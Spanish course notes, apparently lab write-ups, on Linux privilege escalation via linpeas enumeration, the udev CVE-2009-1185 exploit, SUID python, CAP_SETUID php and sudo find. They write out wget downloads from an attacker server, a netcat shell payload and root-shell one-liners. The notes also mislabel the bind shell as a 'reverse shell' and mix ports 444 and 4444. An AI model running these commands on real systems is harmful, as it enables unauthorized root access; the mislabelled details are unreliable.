Documentos de Referencia: "AS-II - Escalada de privilegios I.pdf"

# Informe Técnico: Herramientas de Enumeración y Recolección en Escalada de Privilegios

### 1. Resumen Ejecutivo
Este informe técnico se centra en el proceso de recolección de información en la fase de post-explotación, específicamente en el contexto de la escalada de privilegios. Se subraya la importancia de enumerar y analizar información del sistema de manera exhaustiva para identificar vectores de ataque que permitan a un atacante elevar sus permisos de usuario. Se presentan herramientas de enumeración tanto para sistemas Linux como Windows, y se describen los procedimientos prácticos para utilizar estas herramientas en un entorno de laboratorio, incluyendo la superación de limitaciones comunes en sistemas obsoletos o restringidos.

---

### 2. Conceptos Fundamentales
Una vez que un atacante ha obtenido acceso remoto a un sistema con privilegios limitados, la **escalada de privilegios** es la siguiente acción más importante en la fase de post-explotación. Este proceso consiste en explotar malas configuraciones o vulnerabilidades en el sistema remoto para obtener permisos de un usuario con mayores privilegios, con el objetivo final de convertirse en **root** o **administrador**.

La información que se debe recolectar para identificar posibles vectores de ataque incluye, pero no se limita a:
* **Versión del sistema operativo y paquetes vulnerables**: Buscar versiones del sistema operativo o del kernel con vulnerabilidades conocidas que permitan la escalada de privilegios.
* **Archivos y carpetas con permisos laxos**: Identificar archivos o directorios que tienen permisos de lectura, escritura o modificación para usuarios sin privilegios, lo que podría revelar información sensible como credenciales o archivos de configuración.
* **Procesos en ejecución y tareas programadas**: Analizar los procesos en marcha y las tareas cron (en sistemas Linux) para encontrar malas configuraciones que puedan ser explotadas.
* **Credenciales almacenadas**: Buscar credenciales, permisos de sudo, variables de entorno y otras configuraciones que puedan ser útiles para el ataque.
* **Arquitectura del sistema**: Determinar la arquitectura del sistema víctima (ej. ARM, 32-bit, 64-bit) para descargar o compilar las herramientas adecuadas.

Esta información puede ser recolectada de forma manual, pero las herramientas de enumeración lo automatizan para hacer el proceso más eficiente.

---

### 3. Procedimientos Prácticos
Los procedimientos prácticos demuestran cómo usar herramientas de enumeración en un entorno de laboratorio compuesto por una máquina atacante Kali Linux y una máquina víctima Metasploitable2.

#### Herramientas de Enumeración en Linux
Se exploran las herramientas **Linux Exploit Suggester** y **PEAS-ng (linpeas.sh)**.

* **Descarga de herramientas en sistemas remotos limitados**:
    * La descarga directa de *scripts* desde un repositorio de GitHub a una máquina víctima obsoleta puede fallar debido a errores de SSL, como se muestra en la captura de pantalla.
    * Para superar esta limitación, se recomienda descargar la herramienta en la máquina atacante (Kali).
    * Una vez descargada en Kali, se levanta un servidor web simple con el comando `sudo python3 -m http.server 80`. Este comando inicia un servidor HTTP en el puerto 80, permitiendo que la víctima descargue el archivo.
    * Desde la máquina víctima, se usa el comando `wget http://[IP_de_Kali]/[nombre_del_script]` para descargar el archivo del servidor web de Kali.

* **Uso de Linux Exploit Suggester**:
    * El *script* Linux Exploit Suggester requiere la versión 4.0 o superior de Bash, lo cual puede ser una limitación en sistemas obsoletos. La ejecución en la máquina víctima muestra un error que indica que la versión de Bash no es compatible, como se observa en la captura de pantalla.

* **Uso de PEAS-ng (linpeas.sh)**:
    * Se determina la arquitectura de la máquina víctima con el comando `uname -a`. El resultado `i686` en el ejemplo indica una arquitectura de 32 bits, por lo que una versión precompilada (`linpeas_linux_386`) podría ser una opción. Sin embargo, se demuestra que la versión compilada puede no funcionar correctamente, como se muestra en la captura de pantalla.
    * Por lo tanto, se opta por la versión de *script* (`linpeas.sh`), que se descarga de la misma manera que el *script* anterior.
    * Se le otorgan permisos de ejecución con `chmod +x linpeas.sh` y se ejecuta con `./linpeas.sh`.
    * El *script* comienza a recopilar información exhaustiva, identificando permisos de escritura en directorios, permisos especiales SUID/SGID en archivos, y otros datos relevantes para la escalada de privilegios, como se muestra en la captura de pantalla de la terminal.

* **Uso del módulo `local_exploit_suggester` de Metasploit**:
    * Dentro de Metasploit, se utiliza el módulo `post/multi/recon/local_exploit_suggester` para automatizar la búsqueda de *exploits* aplicables.
    * Este módulo se carga con `use [índice]` y se configura con `set SESSION [ID_de_sesión]`, ya que es un módulo de post-explotación.
    * Al ejecutar `run`, el módulo analiza la información del sistema víctima y la compara con la base de datos de Metasploit, sugiriendo *exploits* que podrían funcionar para la escalada de privilegios. Este método es más limitado que herramientas como `linpeas.sh`, ya que solo busca *exploits* disponibles dentro del *framework* de Metasploit.

---

### 4. Conclusiones y Puntos Clave
* **Importancia y Beneficios de Seguridad**: La recolección de información en la fase de post-explotación es fundamental para el éxito de un ataque o una auditoría. Permite a los profesionales de seguridad identificar debilidades en la configuración del sistema que no son evidentes a primera vista, como permisos incorrectos, software obsoleto o la existencia de tareas programadas vulnerables.

* **Puntos de Aprendizaje Clave**:
    * La enumeración es un paso esencial en la escalada de privilegios y no debe pasarse por alto.
    * Existen herramientas automáticas que simplifican enormemente esta tarea al centralizar el chequeo de múltiples fuentes de información.
    * Es común encontrar limitaciones en sistemas obsoletos o restringidos, como problemas de compatibilidad con *scripts* (ej. versiones de Bash) o errores de conexión. Los atacantes deben estar preparados para estas situaciones, por ejemplo, levantando un servidor web simple para transferir archivos.
    * Las versiones compiladas de herramientas deben ser compatibles con la arquitectura de la máquina víctima (ej. 32-bit, 64-bit, ARM) para funcionar correctamente.
    * Herramientas como `linpeas.sh` ofrecen un informe visual y detallado que facilita la identificación de vulnerabilidades, destacando información crítica con colores.

* **Relevancia Técnica**: El dominio de estas herramientas y técnicas de recolección es una habilidad central para cualquier profesional del *pentesting* o del *Red Team*. Comprender las limitaciones de cada herramienta y saber cómo superarlas demuestra una capacidad de adaptación crucial en entornos de seguridad. Además, el conocimiento de los diferentes tipos de información a enumerar (versión del kernel, permisos de archivos, tareas cron) es la base para construir una estrategia de ataque efectiva para la escalada de privilegios.

---

Documentos de Referencia: "AS-II - Escalada de privilegios I.pdf"

# Informe Técnico: Escalada de Privilegios en Sistemas Linux

---

### 1. Resumen Ejecutivo

Este informe detalla los procedimientos y conceptos relacionados con la escalada de privilegios en sistemas Linux a través de la explotación de vulnerabilidades a nivel del sistema operativo y del kernel. Se examina la importancia de la enumeración del sistema para identificar software obsoleto o vulnerable, se presenta un caso práctico de explotación de una vulnerabilidad específica en el servicio `udev`, y se enfatiza la necesidad de mantener los sistemas actualizados como medida de defensa fundamental.

---

### 2. Conceptos Fundamentales

La escalada de privilegios en sistemas basados en Unix es una técnica en la que un atacante, que ya ha obtenido acceso inicial a una máquina, eleva sus permisos de un usuario no privilegiado a un superusuario o **root**. Este proceso es posible debido a vulnerabilidades o fallos de programación en el kernel o el sistema operativo mismo.

* **Vulnerabilidades a Nivel de Sistema Operativo y Kernel**: Los sistemas Unix, incluyendo distribuciones como Debian, Ubuntu y CentOS, son susceptibles a vulnerabilidades que permiten a un atacante ejecutar código arbitrario y escalar privilegios.
* **Enumeración (Post-Explotación)**: Una vez que el atacante tiene acceso remoto a un sistema, el primer paso es la **enumeración**. Esto implica identificar la versión del kernel, el sistema operativo y las aplicaciones instaladas para buscar vulnerabilidades conocidas que permitan la escalada de privilegios.
* **Exploits**: Un **exploit** es un código diseñado para aprovechar una vulnerabilidad específica. En el contexto de Linux, a menudo es un archivo de código C que se descarga, compila y ejecuta en el sistema objetivo.
* **Vulnerabilidades Conocidas**: El documento menciona varias vulnerabilidades de ejemplo asociadas a sistemas Unix.
    * **Dirty Cow (CVE-2016-5195)**: Una vulnerabilidad de condición de carrera en el subsistema de memoria del kernel de Linux.
    * **Vulnerabilidad en Sudo (CVE-2021-3156)**: Un error `off-by-one` que provoca un desbordamiento de búfer en `sudoedit`, permitiendo la escalada de privilegios a **root**.
    * **Overlayfs (CVE-2023-0386)**: Una vulnerabilidad divulgada públicamente en marzo de 2023.
    * **StackRot (CVE-2023-3269)**: Un fallo en el subsistema de gestión de memoria del kernel de Linux que afecta a casi todas las configuraciones.
    * **Udev 8572.c (CVE-2009-1185)**: El exploit específico utilizado en el laboratorio. Se basa en un fallo donde `udev` no verifica el origen de un mensaje `NETLINK`, permitiendo a un usuario local ganar privilegios.

---

### 3. Procedimientos Prácticos

El procedimiento para escalar privilegios en un sistema Linux comienza con la fase de enumeración y culmina con la ejecución del exploit. El laboratorio práctico se realiza en un entorno de máquinas virtuales con una máquina atacante Kali y un sistema vulnerable **Metasploitable2**.

#### **3.1. Fase de Enumeración**

1.  **Identificación del Kernel y el Sistema Operativo**: Se utilizan comandos de terminal para obtener información detallada del sistema.
    * `uname -a`: Muestra la versión del kernel. En el ejemplo, se identifica el kernel `linux 2.6.24`.
    * `lsb_release -a`: Proporciona detalles sobre la distribución y su versión. Se identifica que el sistema es `ubuntu 8.04`.
    * `dpkg-query -l`: Lista los paquetes y sus versiones instaladas. En el ejemplo, esto revela el paquete `udev` versión `117-8`.

2.  **Búsqueda de Vulnerabilidades**: Una vez que se tiene la información del sistema, se buscan exploits compatibles.
    * Se utiliza la herramienta `searchsploit` para buscar exploits asociados al kernel y la distribución. Por ejemplo, `searchsploit Linux Kernel 2.6` y `searchsploit Ubuntu 8.04` muestran listas de exploits potenciales.
    * Finalmente, la búsqueda se refina a un servicio específico: `searchsploit udev`. El resultado muestra varios exploits, y se selecciona el archivo `8572.c` porque es compatible con la versión de `udev` y el kernel identificados.

#### **3.2. Preparación y Ejecución del Exploit**

1.  **Descarga del Exploit**: El archivo `8572.c` se descarga desde la máquina atacante a la máquina víctima. En el laboratorio, esto se realiza copiándolo desde el repositorio de exploits con el comando `searchsploit -m 8572`, y luego se transfiere a la máquina víctima, que tiene acceso a un servidor web simple montado en la máquina atacante. La descarga en el sistema víctima se hace con `wget http://10.0.2.1/8572.c`.

2.  **Análisis del Exploit**: Antes de la compilación, se examina el código fuente del exploit para entender su funcionamiento y requisitos.
    * Se utiliza `cat 8572.c` para leer el contenido.
    * La documentación interna del exploit indica que explota la vulnerabilidad `CVE-2009-1185`, y que requiere el `PID` del socket de `udevd` como argumento para funcionar.
    * Además, el exploit está diseñado para ejecutar un script llamado `/tmp/run` con privilegios de **root**.

3.  **Preparación del Payload**: Se crea el script `/tmp/run` que será ejecutado por el exploit. El objetivo es que este script establezca una **backdoor** o puerta trasera que dé una shell de **root** al atacante.
    * Se utiliza el comando `echo '#!/bin/bash' > run` para crear el archivo y definirlo como un script de bash. El operador `>` redirige la salida del comando al archivo, sobrescribiéndolo si ya existe.
    * Se usa el comando `echo 'nc -lnp 444 -e /bin/sh' >> run` para añadir la línea del `payload` al final del script. El operador `>>` concatena el contenido sin sobrescribir.
    * La línea `nc -lnp 444 -e /bin/sh` utiliza la herramienta **Netcat** para:
        * `-l` (listen): Poner a Netcat en modo de escucha.
        * `-n` (numeric-only): Evitar la resolución de nombres.
        * `-p 444`: Especificar el puerto de escucha (en el documento se menciona también el 4444).
        * `-e /bin/sh` (execute): Abrir una shell `/bin/sh` cuando se conecte un cliente, creando una **reverse shell**.

4.  **Compilación del Exploit**: El archivo de código C se compila en un ejecutable binario.
    * El comando `gcc -o exploit 8572.c` compila el archivo `8572.c` y guarda el resultado con el nombre `exploit`.

5.  **Ejecución del Exploit**: Se ejecuta el archivo compilado `exploit` pasándole el `PID` del proceso `udevd` como argumento, que se había identificado previamente como `2362`.
    * El comando es `./exploit 2362`.

6.  **Acceso a la Shell de Root**: Una vez que el exploit se ejecuta con éxito, el script `/tmp/run` se ejecuta con permisos de **root**, lo que abre la **reverse shell** en el puerto 444.
    * Desde la máquina atacante, se usa `nc` para conectarse a la IP de la máquina víctima en el puerto 444. En el ejemplo, el comando es `nc 10.0.2.19 4444`.
    * Si todo funciona correctamente, se obtiene una shell remota con privilegios de superusuario, logrando la escalada de privilegios.

---

### 4. Conclusiones y Puntos Clave

#### **Importancia y Beneficios de Seguridad**

El análisis de este procedimiento resalta la importancia crítica de la **gestión de parches y la actualización del software**. La mayoría de los exploits de escalada de privilegios se basan en vulnerabilidades conocidas y ya corregidas. Mantener los sistemas operativos y sus kernels actualizados es la defensa más efectiva contra este tipo de ataques, ya que los desarrolladores publican constantemente parches de seguridad para mitigar estas vulnerabilidades.

#### **Puntos de Aprendizaje Clave**

* **La enumeración es la base de la explotación**: Antes de intentar cualquier ataque, es fundamental recopilar la mayor cantidad de información posible sobre el sistema objetivo para identificar las vulnerabilidades aplicables.
* **Las vulnerabilidades no son iguales**: Los exploits varían en su complejidad y en los requisitos de ejecución. Algunos pueden ser tan simples como descargar, compilar y ejecutar un archivo, mientras que otros, como el de `udev`, requieren la identificación de parámetros específicos (como el `PID`) y la creación de un `payload` personalizado.
* **Comprender la vulnerabilidad es clave**: Analizar la información del exploit (a menudo incluida en comentarios del código) es vital para entender su funcionamiento y los pasos necesarios para que la explotación sea exitosa.

#### **Relevancia Técnica**

Los procedimientos detallados son relevantes para profesionales de la ciberseguridad, como auditores y hackers éticos, en un contexto de **post-explotación**. La capacidad de un atacante para escalar privilegios es un paso crítico para obtener control total sobre un sistema. Por lo tanto, comprender estas técnicas es esencial para evaluar la postura de seguridad de un sistema y desarrollar medidas de defensa robustas, como la implementación de firewalls y la aplicación de políticas de mínimo privilegio.

---

Documentos de Referencia: "AS-II - Escalada de privilegios I (1).pdf"

# Informe Técnico: Escalada de Privilegios en Linux con SUID/SGID

---

### 1. Resumen Ejecutivo

Este informe técnico explora la escalada de privilegios en sistemas Unix mediante la explotación de los permisos especiales **SUID** (Set User ID) y **SGID** (Set Group ID). El documento detalla el funcionamiento del bit **SUID**, su representación en la configuración de permisos de archivos, y su uso por parte de atacantes para obtener privilegios elevados. Se presenta un caso práctico de laboratorio para ilustrar cómo un usuario no privilegiado puede explotar un binario del sistema, como Python, con el bit **SUID** activado para obtener una sesión con privilegios de **root**, y se subraya la importancia de una configuración de seguridad adecuada para prevenir este tipo de ataques.

---

### 2. Conceptos Fundamentales

En los sistemas Unix, los permisos de archivos se dividen en tres categorías principales: propietario (`Owner`), grupo (`Group`) y otros usuarios (`Other Users`). Cada categoría tiene permisos de lectura (`r`), escritura (`w`) y ejecución (`x`), que tienen una representación octal (4 para leer, 2 para escribir, 1 para ejecutar).

* **SUID (Set User ID)**: Es un permiso especial que permite que un archivo ejecutable se ejecute con los permisos del **propietario** del archivo, en lugar de los permisos del usuario que lo ejecuta. Esto es útil para programas que necesitan acceder a recursos restringidos, como el comando `passwd`, que debe modificar el archivo `/etc/shadow` propiedad de **root**. Cuando el bit **SUID** está activado y el propietario del archivo es **root**, el programa se ejecuta temporalmente con privilegios de **root**.
* **SGID (Set Group ID)**: Un permiso similar al **SUID** pero que otorga los permisos del grupo propietario del archivo.
* **Representación de Permisos Especiales**: Los permisos especiales **SUID**, **SGID** y `Sticky Bit` se añaden a la representación octal de los permisos de archivo. El bit **SUID** se representa con el número `4000`, el **SGID** con `2000`, y el `Sticky Bit` con `1000`. Por ejemplo, un binario con permisos `4777` tiene el bit **SUID** activo, y todos los usuarios pueden leer, escribir y ejecutarlo.
* **Representación Visual**: En la notación de permisos, el bit **SUID** se representa con una "s" en lugar de la "x" en la sección de permisos del propietario (por ejemplo, `-rwsr-xr-x`). Esto indica que el binario tiene la propiedad **SUID** activa y que el usuario que lo ejecute heredará los permisos del propietario.

---

### 3. Procedimientos Prácticos

El laboratorio demuestra cómo un atacante puede explotar una mala configuración del bit **SUID** en un sistema Linux.

#### **3.1. Fase de Reconocimiento**

1.  **Creación y Autenticación de Usuario**: Se crea un usuario sin privilegios llamado `chema` con el comando `sudo adduser chema` y luego se accede a su sesión con `su chema`.
2.  **Identificación del Binario a Explotar**: Para el laboratorio, se elige el binario `python3.11`.
    * Se utiliza `which python` y `which python3` para encontrar la ruta del binario, revelando que ambos son enlaces simbólicos.
    * Se utiliza `ls -l` para verificar la ruta final, que es `/usr/bin/python3.11`.
3.  **Verificación de Permisos Iniciales**: Se comprueba que el binario `python3.11` es propiedad de **root** y tiene permisos de ejecución normales (`-rwxr-xr-x`). Esto confirma que, en su estado actual, la ejecución del binario se realiza con los permisos del usuario `chema`, no de **root**.

#### **3.2. Activación del Bit SUID (Simulación de Mala Configuración)**

1.  **Modificación de Permisos**: Un usuario con privilegios de **root** (simulando una mala configuración del sistema) activa el bit **SUID** en el binario.
    * Se usa `sudo su` para autenticarse como superusuario.
    * Se ejecuta el comando `chmod +s /usr/bin/python3.11` para añadir el permiso **SUID**.
2.  **Verificación del Cambio**: Se listan los permisos del binario nuevamente con `ls -l /usr/bin/python3.11` para confirmar que la `x` del propietario ha sido reemplazada por una `s` (`-rwsr-sr-x`), lo que indica que el bit **SUID** está activo.

#### **3.3. Explotación y Escalada de Privilegios**

1.  **Localización de Payload**: Para explotar la vulnerabilidad, se utiliza la herramienta **GTFOBins**, un repositorio que proporciona payloads para binarios con **SUID** activo. La búsqueda del binario `python` muestra que puede crear una **shell**, entre otras funciones sensibles. El payload sugerido es `python3.11 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`.
2.  **Ejecución del Payload**: El usuario `chema` ejecuta el payload obtenido.
    * Se invoca el binario `python3.11`.
    * El parámetro `-c` permite ejecutar código directamente desde la línea de comandos.
    * El código `import os; os.execl("/bin/sh", "sh", "-p")` importa la biblioteca `os` y utiliza la función `os.execl` para ejecutar el comando `/bin/sh` con la opción `-p`. La opción `-p` es crucial, ya que permite que la shell mantenga los permisos del proceso que la invoca.
3.  **Confirmación de la Escalada**: Al ejecutar el comando `whoami` dentro de la nueva shell, el usuario `chema` comprueba que ahora es **root**. Esto demuestra que la shell heredó los privilegios del propietario del binario (root) y no los del usuario que la ejecutó.

---

### 4. Conclusiones y Puntos Clave

#### **Importancia y Beneficios de Seguridad**

La mala configuración de los permisos **SUID** es un vector de ataque común y peligroso para la escalada de privilegios en sistemas Unix. Comprender este mecanismo es fundamental para los profesionales de la ciberseguridad, ya que permite a los auditores identificar y corregir estas debilidades antes de que sean explotadas por atacantes. La correcta administración de los permisos de archivos, especialmente el bit **SUID**, es una medida de seguridad crucial para mitigar el riesgo de que un atacante sin privilegios obtenga control total sobre un sistema.

#### **Puntos de Aprendizaje Clave**

* **Listar binarios con SUID**: La primera acción en una auditoría es usar el comando `find` para listar todos los archivos con el bit **SUID** activo.
* **No todos los SUID son un riesgo**: Un binario con **SUID** no representa un riesgo si no tiene la capacidad de ejecutar comandos o acceder a archivos sensibles. Por ejemplo, el comando `ls` no es una amenaza.
* **Herramientas para la auditoría**: Sitios como **GTFOBins** son recursos invaluables que facilitan la identificación de binarios con **SUID** y sus posibles usos para la escalada de privilegios, proporcionando los `payloads` específicos.

#### **Relevancia Técnica**

La capacidad de explotar binarios **SUID** es una habilidad técnica crítica en el arsenal de un hacker ético o auditor de seguridad. Este procedimiento demuestra cómo una configuración aparentemente inocua puede convertirse en una vulnerabilidad grave. Un atacante puede no necesitar conocer la contraseña de **root** si puede ejecutar un binario con **SUID** activado y con un `payload` que le dé una shell de **root**. Esto subraya la importancia de una auditoría exhaustiva de los permisos de archivos en un sistema.

---

Documentos de Referencia: "AS-II - Escalada de privilegios I.pdf"

# Informe Técnico: Escalada de Privilegios utilizando Linux Capabilities

---

### 1. Resumen Ejecutivo

Este informe técnico explora la **escalada de privilegios** en sistemas Unix a través de la explotación de **Linux Capabilities**. Las capabilities son un concepto de seguridad que divide los privilegios de **root** en unidades más pequeñas y granulares. El informe explica qué son las capabilities, por qué surgieron y cómo un atacante puede explotar una mala configuración para obtener privilegios elevados. Se detallan los comandos clave para su gestión y se presenta un caso práctico de laboratorio para ilustrar cómo un atacante podría pasar de ser un usuario sin privilegios a un superusuario sin conocer su contraseña.

---

### 2. Conceptos Fundamentales

* **Linux Capabilities**: Son un concepto de seguridad que divide los privilegios de **root** en unidades más pequeñas y granulares. Permiten que un programa o usuario ejecute acciones con privilegios elevados sin necesidad de tener un control total del sistema. Esto minimiza el riesgo si el programa es comprometido, ya que solo recibe el subconjunto de privilegios que necesita.
* **Diferencia con SUID**: A diferencia del bit **SUID**, que otorga temporalmente todos los permisos del propietario del archivo (normalmente **root**), las capabilities son más granulares. Permiten asociar porciones específicas de los privilegios de superusuario a un binario, como el permiso para leer archivos sensibles, acceder a la red, o realizar operaciones de administración.
* **Permisos de Capabilities**: Las capabilities tienen tres tipos de conjuntos de permisos:
    * **Efectivo (`effective`)**: Las capabilities que se aplican al proceso en ejecución.
    * **Permitido (`permitted`)**: El conjunto máximo de capabilities que un proceso puede tener.
    * **Heredable (`inheritable`)**: Capabilities que se pueden pasar a un subproceso durante la ejecución.

---

### 3. Procedimientos Prácticos

El laboratorio se lleva a cabo en un entorno con una máquina Kali Linux para demostrar cómo se puede escalar privilegios de un usuario sin privilegios (`chema`) a un superusuario (**root**).

#### **3.1. Fase de Enumeración**

1.  **Listado de Capabilities**: La primera acción de un atacante o auditor es listar todos los binarios que tienen capabilities asignadas. Esto se logra con el siguiente comando, que busca recursivamente en todo el sistema y descarta los errores de "permiso denegado":
    `getcap -r / 2>/dev/null`
2.  **Análisis de la Salida**: Como se muestra en la captura de pantalla , el comando lista los binarios y sus capabilities asignadas, como `fping` y `ping` con la capability `cap_net_raw` y `dumpcap` con `cap_net_admin` y `cap_net_raw`. La salida en el laboratorio no incluye inicialmente el binario `php8.2`.
3.  **Búsqueda de Binarios Explotables**: El atacante debe identificar qué binarios con capabilities son potencialmente peligrosos. Para esto, se puede consultar un repositorio como **GTFOBins**. La búsqueda de binarios como `ping` no arroja resultados que permitan una escalada directa, mientras que binarios como `php`, `python`, o `perl` sí tienen la opción de ser explotados con capabilities. La imagen de **GTFOBins** muestra que si el binario `php` tiene la capability `CAP_SETUID`, puede ser usado como una **backdoor** para obtener privilegios.

#### **3.2. Activación de la Capability (Simulación de Ataque)**

1.  **Asignación de Capability**: Para la demostración, el binario `php8.2` (que es el binario real al que apunta `php`) se le asigna la capability `CAP_SETUID`. Esto se realiza como superusuario con el siguiente comando:
    `sudo setcap cap_setuid+ep /usr/bin/php8.2`
2.  **Verificación del Cambio**: Al volver a ejecutar `getcap`, la salida ahora muestra que `php8.2` tiene la capability `cap_setuid=ep`, lo que confirma que la asignación fue exitosa.

#### **3.3. Explotación y Escalada de Privilegios**

1.  **Ejecución del Payload**: Con la capability asignada, el usuario no privilegiado `chema` ejecuta el `payload` obtenido de GTFOBins. Este payload le dice al binario de `php` que cambie su ID de usuario a **root** (UID 0) y luego ejecute una shell de comandos.
    `php8.2 -r "posix_setuid(0); system('/bin/sh');"`
2.  **Obtención de la Shell de Root**: Al ejecutar el comando `whoami` dentro de la nueva shell, el usuario verifica que ahora es **root**. Esto confirma la escalada de privilegios, ya que la shell fue creada con los permisos de **root**, el propietario del binario `php8.2`. La escalada se logra sin necesidad de conocer la contraseña de **root**.

---

### 4. Conclusiones y Puntos Clave

#### **Importancia y Beneficios de Seguridad**

Las **Linux Capabilities** son una herramienta poderosa que, si se utiliza correctamente, mejora la seguridad de un sistema al limitar los privilegios de los programas a lo estrictamente necesario. Sin embargo, una mala configuración puede convertirse en una puerta trasera para que un atacante escale privilegios, lo que las convierte en un tema crucial para los profesionales de la ciberseguridad. A diferencia del **SUID**, que es más genérico, las capabilities permiten un control más granular, lo que las hace muy útiles para ejecutar tareas privilegiadas con los mínimos permisos necesarios.

#### **Puntos de Aprendizaje Clave**

* **La enumeración es vital**: Un atacante o auditor debe listar primero todos los binarios que tienen capabilities.
* **La mala configuración es el riesgo**: La vulnerabilidad no reside en la existencia de las capabilities, sino en la asignación incorrecta de las mismas a binarios que pueden ser explotados para escalar privilegios.
* **Principio del mínimo privilegio**: La mejor práctica es conceder a un programa solo las capabilities que necesita para funcionar, y nada más.

#### **Relevancia Técnica**

La capacidad de explotar binarios con capabilities mal configuradas es una habilidad técnica crítica para los auditores de sistemas. El procedimiento de laboratorio demuestra cómo un atacante puede obtener acceso de **root** sin la contraseña, lo que subraya la importancia de auditar regularmente los permisos del sistema. Un atacante puede aprovechar la `CAP_SETUID` para cambiar su UID a **root** y ejecutar comandos con privilegios elevados.

---

Documentos de Referencia: "AS-II - Escalada de privilegios I.pdf"

# Informe Técnico: Escalada de Privilegios Utilizando SUDO

## 1. Resumen Ejecutivo
Este informe técnico profundiza en la escalada de privilegios en sistemas Linux, centrándose en el abuso de permisos `sudo`. Explora cómo una configuración incorrecta de estos permisos puede ser explotada por un atacante para pasar de un usuario con privilegios limitados a uno con privilegios de administrador. Se detallan los conceptos clave, la sintaxis del archivo de configuración `sudoers`, y los procedimientos prácticos para identificar y explotar permisos `sudo` mal configurados.

---

## 2. Conceptos Fundamentales

### Sudo (Substitute User and Do)
El comando `sudo` permite a un usuario ejecutar comandos como otro usuario, típicamente como el superusuario (root). A diferencia del usuario `root`, que requiere su propia contraseña, los usuarios pueden utilizar el comando `sudo` con su propia contraseña o sin ninguna, dependiendo de la configuración. Esta configuración se define en el archivo `/etc/sudoers`.

### El Archivo `/etc/sudoers`
El archivo `/etc/sudoers` es donde se almacenan las reglas que deciden qué permisos de `sudo` se otorgan a los usuarios. La sintaxis de cada regla sigue el siguiente formato:

* **Usuario**: El usuario al que se le aplican los permisos.
* **Terminal**: El terminal desde el que el usuario puede usar el comando `sudo`.
* **Usuarios a emular**: Los usuarios bajo los cuales el usuario puede ejecutar comandos. Esto a menudo se establece como `root` o `ALL` (cualquier usuario).
* **Comandos**: Los comandos que el usuario puede ejecutar con `sudo`.

Ejemplos de sintaxis en el archivo `sudoers`:
* `root ALL=(ALL) ALL`: Este es el caso más común, donde el usuario `root` puede ejecutar cualquier comando desde cualquier terminal, actuando como cualquier usuario.
* `chema ALL=/sbin/poweroff`: El usuario `chema` puede ejecutar el comando `/sbin/poweroff` desde cualquier terminal.
* `chema ALL=(root) NOPASSWD: /usr/bin/find`: Este es un caso crítico. El usuario `chema` puede ejecutar el comando `/usr/bin/find` como el usuario `root` sin necesidad de introducir su contraseña.

### GTFOBins
GTFOBins es un repositorio en línea que documenta binarios de Unix que pueden ser utilizados por un atacante para escalar privilegios. La herramienta identifica si ciertos binarios con permisos `sudo` pueden dar lugar a una escalada de privilegios, como la creación de una shell de `root` o la lectura de archivos sensibles.

---

## 3. Procedimientos Prácticos

### Determinación de Permisos de `sudo`
El primer paso en la escalada de privilegios es identificar qué permisos de `sudo` tiene un usuario en una sesión remota. Para ello, se utiliza el comando `sudo -l`. Este comando lista los comandos que el usuario puede ejecutar con permisos especiales.

### Abuso de Permisos `sudo` con `find`
Una vez identificados los permisos, se puede abusar de ellos si un binario peligroso como `find` está configurado para ejecutarse con permisos de `root` sin contraseña.

1. **Reconfiguración del archivo `sudoers`**: Para simular un entorno vulnerable, se accede al archivo `sudoers` utilizando el comando `sudo visudo`. Este comando permite editar el archivo de configuración.
2. **Añadir la regla vulnerable**: Dentro del archivo, se añade una línea que permite al usuario `chema` ejecutar el binario `find` con permisos de `root` y sin contraseña. La línea es `chema ALL=(root) NOPASSWD: /usr/bin/find`.
3. **Verificación de la nueva configuración**: Después de guardar el archivo, se ejecuta de nuevo `sudo -l`. La salida confirmará que el usuario `chema` ahora puede ejecutar `/usr/bin/find` con privilegios de `root` y sin contraseña, tal como se muestra en la captura de pantalla.
4. **Ejecución del comando de escalada**: Utilizando el repositorio GTFOBins, se encuentra el comando específico que abusa del binario `find` para obtener una shell de `root`. El comando es `sudo find -exec /bin/sh -p \; -quit`.

### Explicación detallada de los comandos
* **`sudo find -exec /bin/sh -p \; -quit`**: Este comando aprovecha los permisos de `sudo` sobre el binario `find`.
    * `sudo`: Permite ejecutar el comando `find` con los permisos de `root`.
    * `find`: El comando de búsqueda de archivos que es vulnerable a ser explotado.
    * `-exec /bin/sh -p \;`: Esta es la parte crucial. `-exec` le indica a `find` que ejecute un comando externo.
        * `/bin/sh`: Es el comando que se va a ejecutar, en este caso, una shell.
        * `-p`: Esta opción le dice al shell que se ejecute en modo privilegiado, heredando los permisos del proceso que lo ejecutó, en este caso, `root`.
        * `\;`: El punto y coma, escapado con una barra invertida, marca el final del comando a ejecutar con `-exec`.
    * `-quit`: Indica a `find` que termine inmediatamente después de encontrar el primer archivo y ejecutar el comando. Esto evita la apertura de múltiples shells.

Al ejecutar este comando, se obtiene una shell de `root`. Esto demuestra cómo una configuración peligrosa de `sudo` puede ser explotada para escalar privilegios.

---

## 4. Conclusiones y Puntos Clave

### Importancia y Beneficios de Seguridad
La escalada de privilegios es una de las fases más críticas en un ataque informático. Este procedimiento demuestra que incluso cuando un usuario tiene permisos limitados sobre un solo comando, como `find`, si ese comando puede ser utilizado para ejecutar una shell con privilegios de `root`, se puede comprometer la seguridad del sistema. La configuración segura del archivo `sudoers` es vital para mitigar estos riesgos. Limitar los permisos de `sudo` solo a lo estrictamente necesario y auditar los binarios utilizados es fundamental para evitar la escalada.

### Puntos de Aprendizaje Clave
* **Permisos `sudo` y el archivo `sudoers`**: Entender cómo se configuran los permisos `sudo` es el primer paso para identificar vulnerabilidades.
* **Identificación de vulnerabilidades**: El comando `sudo -l` es una herramienta esencial para que un atacante determine sus capacidades.
* **Binarios peligrosos**: No todos los permisos de `sudo` son iguales. Algunos binarios, como `find`, tienen funcionalidades que permiten la ejecución de comandos externos, lo que los convierte en un vector de ataque si se usan con privilegios elevados.
* **Uso de herramientas de referencia**: Recursos como GTFOBins son cruciales para que los profesionales de la seguridad y los atacantes puedan identificar cómo explotar binarios con permisos especiales.

### Relevancia Técnica
Los procedimientos aprendidos son altamente relevantes en un entorno profesional, tanto para atacantes como para defensores. Un analista de seguridad debe saber cómo un atacante podría abusar de la configuración de `sudo` para auditar y fortificar los sistemas. Del mismo modo, un administrador de sistemas debe aplicar el principio del menor privilegio al configurar los permisos, garantizando que los usuarios solo tengan los permisos necesarios para realizar sus tareas y evitando configuraciones que puedan ser explotadas para obtener acceso de `root`. La lección principal es que incluso una "limitación" aparentemente segura puede ser un punto ciego si el binario permitido tiene funcionalidades que pueden ser abusadas.

---

Documentos de Referencia: "AS-II - Escalada de privilegios II.pdf"

